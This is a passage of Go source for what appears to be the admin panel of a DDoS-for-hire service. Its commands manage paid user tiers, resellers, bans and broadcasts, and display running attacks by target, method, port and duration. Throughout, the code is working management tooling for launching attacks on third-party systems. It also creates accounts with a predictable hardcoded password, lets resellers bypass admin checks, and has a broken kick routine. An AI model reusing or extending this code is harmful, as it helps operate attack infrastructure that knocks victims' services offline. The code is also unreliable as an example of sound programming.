			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Added Premium To Users: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mPremium Has Been Added!\033[00;0m\r")
			continue

		case "home=false":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: home=false (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.RemoveHome(user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Remove Home!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Removed Home For User: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mHome Has Been Removed From "+user.username+"!\033[00;0m\r")
			continue

		case "home=true":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: home=true (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.MakeHome(user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Add Home!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Added Home To Users: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mHome Has Been Added!\033[00;0m\r")
			continue

		case "reseller=false":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: reseller-false (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.RemoveSeller(user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Remove Seller!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Removed Seller For User: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mSeller Has Been Removed From "+user.username+"!\033[00;0m\r")
			continue

		case "reseller=true":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: reseller=true (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.MakeSeller(user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Add Seller!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Added Seller To Users: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mSeller Has Been Added!\033[00;0m\r")
			continue

		case "removeuser":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: removeuser (username)\033[0m\r")
				continue
			}
			_, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}
			if !database.RemoveUser(args[1]) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to Remove User\r\n")))
			} else {
				this.conn.Write([]byte("User Successfully Removed!\r\n"))
			}
			continue

		case "adduser":
			if userInfo.seller == true {
				goto skipadminauth3
			}
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
		skipadminauth3:
			if len(args) < 3 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: adduser <username> <expiry>\033[0m\r")
				continue
			}
			new_un := args[1]
			planExpireDaysStr := args[2]
			expiry, err := strconv.Atoi(planExpireDaysStr)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mInvalid Expiry!\033[0m\r\n")))
				continue
			}
			this.conn.Write([]byte("\033[97mAdd This User? (\033[00;92mY\033[97m/\033[91mn\033[97m):\033[0m "))
			confirm, err := this.ReadLine(false, false)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, expiry) {
				this.conn.Write([]byte(fmt.Sprintf("\033[91m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\033[1;97m------------------------------------\033[0m\r\n"))
				this.conn.Write([]byte("\033[92mAccount Has Been Added Successfully\033[0m\r\n"))
				this.conn.Write([]byte(fmt.Sprintf("\033[97mUsername:\033[0m %s\r\n", new_un)))
				this.conn.Write([]byte(fmt.Sprintf("\033[97mPassword: \033[0m" + new_un + "432@-0-0\r\n")))
				this.conn.Write([]byte(fmt.Sprintf("\033[97mExpiry: \033[0m%s\r\n", planExpireDaysStr)))
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
			}
			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Added: " + new_un + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
				f.Close()
			}
			err = f.Close()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
				continue
			}
			continue

		case "kick":

			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}

			if len(args) < 2 {
				this.conn.Write([]byte("\033[0;97mExample: \033[96mkick \033[0;97m<\033[96musername\033[0;97m>\r\n"))
				continue
			}
			i := 1
			//sessionMutex.Lock()
			for _, s := range sessions {
				if args[1] == s.Username {
					go func(ss *Session) {
						ss.Conn.Close()
						return
						ss.Remove()
						//s.Remove()
						buf := make([]byte, 20)
						s.Conn.Read(buf)
					}(s)
					fmt.Fprintf(this.conn, "\033[31mUnkown Error\r\n")
				}
				i++
				fmt.Fprintf(this.conn, "\033[0;97mSuccessfully force kicked user on session %d\r\n", i)
				continue
			}
			//sessionMutex.Unlock()
			continue

		case "ongoing":
			if userInfo.admin == true {
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "\033[97m#\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mTarget\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mMethod\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mPort\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mLength\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mFinish\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mUser\033[0m"},
					},
				}

				Attacks, _ := database.Ongoing(username)

				count := 0
				for _, s := range Attacks {
					lol, _ := strconv.ParseInt(strconv.Itoa(int(s.end)), 10, 64)
					TimeToWait := time.Unix(lol, 0)
					count++
					r := []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(count)},
						{Align: simpletable.AlignCenter, Text: s.target},
						{Align: simpletable.AlignCenter, Text: s.method},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.port)},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.duration)},
						{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%.0f secs", time.Until(TimeToWait).Seconds())},
						{Align: simpletable.AlignCenter, Text: s.username},
					}

					table.Body.Cells = append(table.Body.Cells, r)
				}

				if len(table.Body.Cells) == 0 {

					this.conn.Write([]byte("\033[0mThere are no attacks running\r\n"))
					continue
				}

				if len(table.Body.Cells) > 0 {
					table.SetStyle(simpletable.StyleCompact)

					if count%19 == 0 && count != 0 {
						table.SetStyle(simpletable.StyleUnicode)
						fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
						fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

						table.Body.Cells = make([][]*simpletable.Cell, 0)

						this.conn.Read(make([]byte, 10))
						fmt.Fprint(this.conn, "\033c")
					}
				}

				if len(table.Body.Cells) > 0 {
					fmt.Fprintf(this.conn, "\033c")
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprint(this.conn, "")
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\r")

				}
			} else {
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "\033[97m#\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mTarget\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mPort\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mLength\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mFinish\033[0m"},
					},
				}

				Attacks, _ := database.Ongoing(username)

				count := 0
				for _, s := range Attacks {
					lol, _ := strconv.ParseInt(strconv.Itoa(int(s.end)), 10, 64)
					TimeToWait := time.Unix(lol, 0)
					count++
					r := []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(count)},
						{Align: simpletable.AlignCenter, Text: s.target},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.port)},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.duration)},
						{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%.0f secs", time.Until(TimeToWait).Seconds())},
					}

					table.Body.Cells = append(table.Body.Cells, r)
				}

				if len(table.Body.Cells) == 0 {
					this.conn.Write([]byte("\033[0mThere are no attacks running\r\n"))
					continue
				}

				if len(table.Body.Cells) > 0 {
					table.SetStyle(simpletable.StyleCompact)

					if count%19 == 0 && count != 0 {
						table.SetStyle(simpletable.StyleUnicode)
						fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
						fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

						table.Body.Cells = make([][]*simpletable.Cell, 0)

						this.conn.Read(make([]byte, 10))
						fmt.Fprint(this.conn, "\033c")
					}
				}

				if len(table.Body.Cells) > 0 {
					fmt.Fprintf(this.conn, "\033c")
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprint(this.conn, "")
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\r")
				}
			}
			continue

		case "running":
			if userInfo.admin == true {
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "\033[97m#\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mTarget\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mMethod\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mPort\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mLength\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mFinish\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mUser\033[0m"},
					},
				}

				Attacks, _ := database.Ongoing(username)

				count := 0
				for _, s := range Attacks {
					lol, _ := strconv.ParseInt(strconv.Itoa(int(s.end)), 10, 64)
					TimeToWait := time.Unix(lol, 0)
					count++
					r := []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(count)},
						{Align: simpletable.AlignCenter, Text: s.target},
						{Align: simpletable.AlignCenter, Text: s.method},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.port)},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.duration)},
						{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%.0f secs", time.Until(TimeToWait).Seconds())},
						{Align: simpletable.AlignCenter, Text: s.username},
					}

					table.Body.Cells = append(table.Body.Cells, r)
				}

				if len(table.Body.Cells) == 0 {

					this.conn.Write([]byte("\033[0mThere are no attacks running\r\n"))
					continue
				}

				if len(table.Body.Cells) > 0 {
					table.SetStyle(simpletable.StyleCompact)

					if count%19 == 0 && count != 0 {
						table.SetStyle(simpletable.StyleUnicode)
						fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
						fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

						table.Body.Cells = make([][]*simpletable.Cell, 0)

						this.conn.Read(make([]byte, 10))
						fmt.Fprint(this.conn, "\033c")
					}
				}

				if len(table.Body.Cells) > 0 {
					fmt.Fprintf(this.conn, "\033c")
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprint(this.conn, "")
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\r")

				}
			} else {
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "\033[97m#\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mTarget\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mPort\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mLength\033[0m"},
						{Align: simpletable.AlignCenter, Text: "\033[33mFinish\033[0m"},
					},
				}

				Attacks, _ := database.Ongoing(username)

				count := 0
				for _, s := range Attacks {
					lol, _ := strconv.ParseInt(strconv.Itoa(int(s.end)), 10, 64)
					TimeToWait := time.Unix(lol, 0)
					count++
					r := []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(count)},
						{Align: simpletable.AlignCenter, Text: s.target},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.port)},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.duration)},
						{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%.0f secs", time.Until(TimeToWait).Seconds())},
					}

					table.Body.Cells = append(table.Body.Cells, r)
				}

				if len(table.Body.Cells) == 0 {
					this.conn.Write([]byte("\033[0mThere are no attacks running\r\n"))
					continue
				}

				if len(table.Body.Cells) > 0 {
					table.SetStyle(simpletable.StyleCompact)

					if count%19 == 0 && count != 0 {
						table.SetStyle(simpletable.StyleUnicode)
						fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
						fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

						table.Body.Cells = make([][]*simpletable.Cell, 0)

						this.conn.Read(make([]byte, 10))
						fmt.Fprint(this.conn, "\033c")
					}
				}

				if len(table.Body.Cells) > 0 {
					fmt.Fprintf(this.conn, "\033c")
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprint(this.conn, "")
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\r")
				}
			}
			continue

		case "bans":
			if userInfo.seller == true {
				goto skipadminauth4
			}
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
		skipadminauth4:

			table := simpletable.New()
			var i = 0
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Vip"},
					{Align: simpletable.AlignCenter, Text: "Expiry"},
					{Align: simpletable.AlignCenter, Text: "Banned For"},
				},
			}

			users, err := database.GetUsers()
			if err != nil {
				fmt.Println(err)
				fmt.Fprintln(this.conn, "error\r")
				continue
			}

			var bannedUsers []User
			for _, user := range users {
				if user.ban > time.Now().Unix() {
					bannedUsers = append(bannedUsers, user)
				}
			}

			for _, user := range bannedUsers {

				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
					{Text: user.username},
					{Text: formatBool(user.admin)},
					{Text: formatBool(user.vip)},
					{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
					{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.ban, 0))).Hours()/24)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
				if i%19 == 0 && i != 0 {
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

					table.Body.Cells = make([][]*simpletable.Cell, 0)

					this.conn.Read(make([]byte, 10))
					fmt.Fprint(this.conn, "\033c")
				}
			}

			if len(table.Body.Cells) > 0 {
				fmt.Fprintf(this.conn, "\033c")
				table.SetStyle(simpletable.StyleUnicode)
				fmt.Fprint(this.conn, "")
				fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
				fmt.Fprintln(this.conn, "\r")

			}
			continue

		case "broadcast":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				this.conn.Write([]byte(fmt.Sprintf("\033[97mbroadcast \033[00;1;96m<\033[97mmessage\033[00;1;96m> \033[0m\r\n")))
				continue
			}

			for _, s := range sessions {
				s.Conn.Write([]byte(fmt.Sprintf("\x1b[0m\x1b7\x1b[1A\r\x1b[2K\x1b[33m" + username + ">> " + strings.Join(args[1:], " ") + "\x1b[0m\x1b1\x1b[47m\x1b[0;0m\r\n")))
				jsonprompt, err := ioutil.ReadFile("json/prompt.json")
				if err != nil {
					s.Conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
				}
				stringjsonfile := string(jsonprompt)
				var jsonprompt2 = (gjson.Get(stringjsonfile, "prompt")).String()
				jsonprompt3 := strings.Replace(jsonprompt2, "<<$username>>", s.Username, -1)
				s.Conn.Write([]byte(fmt.Sprintf(jsonprompt3)))
				continue
			}
			continue

		case "sysbroadcast":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				this.conn.Write([]byte(fmt.Sprintf("\033[97msysbroadcast \033[00;1;96m<\033[97mmessage\033[00;1;96m> \033[0m\r\n")))
				continue
			}

			for _, s := range sessions {
				s.Conn.Write([]byte(fmt.Sprintf("\x1b[0m\x1b7\x1b[1A\r\x1b[2K\x1b[4;33msystem\033[0;33m>> \x1b[4;33m" + strings.Join(args[1:], " ") + "\033[0;33m\x1b[0m\x1b1\x1b[47m\x1b[0;0m\r\n")))
				jsonprompt, err := ioutil.ReadFile("json/prompt.json")
				if err != nil {
					s.Conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
				}
				stringjsonfile := string(jsonprompt)
				var jsonprompt2 = (gjson.Get(stringjsonfile, "prompt")).String()
				jsonprompt3 := strings.Replace(jsonprompt2, "<<$username>>", s.Username, -1)
				s.Conn.Write([]byte(fmt.Sprintf(jsonprompt3)))
				continue
			}
			continue

		case "vipusers":
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}

			table := simpletable.New()
			var i = 0
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Vip"},
					{Align: simpletable.AlignCenter, Text: "Cons"},
					{Align: simpletable.AlignCenter, Text: "Ipcd"},
					{Align: simpletable.AlignCenter, Text: "Bypasstime"},
					{Align: simpletable.AlignCenter, Text: "Expiry"},
				},
			}

			users, err := database.GetUsers()
			if err != nil {
				fmt.Println(err)
				fmt.Fprintln(this.conn, "error\r")
				continue
			}

			var vipusers []User
			for _, user := range users {
				if user.vip == true {
					vipusers = append(vipusers, user)
				}
			}

			for _, user := range vipusers {

				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
					{Text: user.username},
					{Text: formatBool(user.vip)},
					{Text: fmt.Sprintf("%d", user.concurrents)},
					{Text: fmt.Sprintf("%d", user.cooldown)},
					{Text: fmt.Sprintf("%d", user.bypasstime)},
					{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
				if i%19 == 0 && i != 0 {
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

					table.Body.Cells = make([][]*simpletable.Cell, 0)

					this.conn.Read(make([]byte, 10))
					fmt.Fprint(this.conn, "\033c")
				}
			}

			if len(table.Body.Cells) > 0 {
				fmt.Fprintf(this.conn, "\033c")
				table.SetStyle(simpletable.StyleUnicode)
				fmt.Fprint(this.conn, "")
				fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
				fmt.Fprintln(this.conn, "\r")

			}
			continue

		case "premiumusers":
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}

			table := simpletable.New()
			var i = 0
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Premium"},
					{Align: simpletable.AlignCenter, Text: "Cons"},
					{Align: simpletable.AlignCenter, Text: "Ipcd"},
					{Align: simpletable.AlignCenter, Text: "Bypasstime"},
					{Align: simpletable.AlignCenter, Text: "Expiry"},
				},
			}

			users, err := database.GetUsers()
			if err != nil {
				fmt.Println(err)
				fmt.Fprintln(this.conn, "error\r")
				continue
			}

			var premiumuserslol []User
			for _, user := range users {
				if user.premium == true {
					premiumuserslol = append(premiumuserslol, user)
				}
			}

			for _, user := range premiumuserslol {

				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
					{Text: user.username},
					{Text: formatBool(user.premium)},
					{Text: fmt.Sprintf("%d", user.concurrents)},
					{Text: fmt.Sprintf("%d", user.cooldown)},
					{Text: fmt.Sprintf("%d", user.bypasstime)},
					{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
				if i%19 == 0 && i != 0 {
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

					table.Body.Cells = make([][]*simpletable.Cell, 0)

					this.conn.Read(make([]byte, 10))
					fmt.Fprint(this.conn, "\033c")
				}
			}

			if len(table.Body.Cells) > 0 {
				fmt.Fprintf(this.conn, "\033c")
				table.SetStyle(simpletable.StyleUnicode)
				fmt.Fprint(this.conn, "")
				fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
				fmt.Fprintln(this.conn, "\r")

			}
			continue

		case "resellerusers":
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}

			table := simpletable.New()
			var i = 0
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Seller"},
					{Align: simpletable.AlignCenter, Text: "Cons"},
					{Align: simpletable.AlignCenter, Text: "Ipcd"},
					{Align: simpletable.AlignCenter, Text: "Hometime"},
					{Align: simpletable.AlignCenter, Text: "Expiry"},
				},
			}

			users, err := database.GetUsers()
			if err != nil {
				fmt.Println(err)
				fmt.Fprintln(this.conn, "error\r")
				continue
			}

			var sellerusewrs []User
			for _, user := range users {
				if user.seller == true {
					sellerusewrs = append(sellerusewrs, user)
				}
			}

			for _, user := range sellerusewrs {

				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
					{Text: user.username},
					{Text: formatBool(user.seller)},
					{Text: fmt.Sprintf("%d", user.concurrents)},
					{Text: fmt.Sprintf("%d", user.cooldown)},
					{Text: fmt.Sprintf("%d", user.hometime)},
					{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
				if i%19 == 0 && i != 0 {
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

					table.Body.Cells = make([][]*simpletable.Cell, 0)

					this.conn.Read(make([]byte, 10))
					fmt.Fprint(this.conn, "\033c")
				}
			}

			if len(table.Body.Cells) > 0 {
				fmt.Fprintf(this.conn, "\033c")
				table.SetStyle(simpletable.StyleUnicode)
				fmt.Fprint(this.conn, "")
				fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
				fmt.Fprintln(this.conn, "\r")

			}
			continue

		case "homeusers":
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}

			table := simpletable.New()
			var i = 0
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Home"},
					{Align: simpletable.AlignCenter, Text: "Cons"},
					{Align: simpletable.AlignCenter, Text: "Ipcd"},
					{Align: simpletable.AlignCenter, Text: "Hometime"},
					{Align: simpletable.AlignCenter, Text: "Expiry"},
				},
			}

			users, err := database.GetUsers()
			if err != nil {
				fmt.Println(err)
				fmt.Fprintln(this.conn, "error\r")
				continue
			}

			var homeeuseras []User
			for _, user := range users {
				if user.home == true {
					homeeuseras = append(homeeuseras, user)
				}
			}

			for _, user := range homeeuseras {

				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
					{Text: user.username},
					{Text: formatBool(user.home)},
					{Text: fmt.Sprintf("%d", user.concurrents)},
					{Text: fmt.Sprintf("%d", user.cooldown)},
					{Text: fmt.Sprintf("%d", user.hometime)},
					{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
				if i%19 == 0 && i != 0 {
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

					table.Body.Cells = make([][]*simpletable.Cell, 0)

					this.conn.Read(make([]byte, 10))
					fmt.Fprint(this.conn, "\033c")
				}
			}

			if len(table.Body.Cells) > 0 {
				fmt.Fprintf(this.conn, "\033c")
				table.SetStyle(simpletable.StyleUnicode)
				fmt.Fprint(this.conn, "")
				fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
